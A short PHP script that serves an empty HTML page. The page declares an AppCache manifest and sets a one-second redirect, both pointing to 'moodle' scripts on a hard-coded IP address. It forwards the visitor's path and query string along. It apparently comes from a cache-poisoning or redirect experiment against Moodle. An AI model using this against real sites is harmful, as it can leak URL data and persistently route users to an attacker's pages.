<?php

function getUrl($script_name) {
	return "http://128.178.77.233" . dirname($_SERVER["SCRIPT_NAME"]) . "/$script_name" . (empty($_SERVER["PATH_INFO"]) ? "" : $_SERVER["PATH_INFO"]) . (empty($_SERVER["QUERY_STRING"]) ? "" : ("?" . $_SERVER["QUERY_STRING"]));
}

echo "<!DOCTYPE HTML>\n<html manifest=\"" . getUrl("moodle-b.php") . "\"><head><meta http-equiv=\"refresh\" content=\"1;URL='" . getUrl("moodle.php") . "'\"></head><body></body></html>";

?>